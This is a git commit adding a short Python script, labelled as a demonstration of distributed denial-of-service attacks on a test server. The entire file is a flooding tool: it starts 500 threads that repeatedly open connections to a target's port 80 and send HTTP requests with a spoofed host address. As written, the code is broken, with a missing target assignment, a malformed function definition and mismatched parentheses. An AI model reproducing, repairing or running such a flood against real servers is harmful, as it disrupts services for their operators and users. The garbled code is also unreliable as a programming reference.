ad2211ec83e1a91e96d92338574cc26ee4ce1eed
thesrikanth <30743319+thesrikanth@users.noreply.github.com>
2022-06-11 02:09:14 +0200

    DDOS script
    Script to demonstrate Distributed Denial of Service attacks on a test server.

---
+++ DDOS.py.py
@@ -0,0 +1,18 @@
+import threading
+import socket
+
+target = # */target Ip*/
+port = 80
+fake_ip = '182.21.20.82'
+
+def_attack() :
+    while true :
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target,port))
+        s.sendto(("GET /"+ target + "HTTP/1.1\r\n").encode('ascii'),(target,port))
+        s.sendto(("Host: "+fake_ip + "\r\n\r\n").encode('ascii')),(target,port))
+        s.close()
+for i in range (500):
+    thread = threading.Thread(target=attack)
+    thread.start()
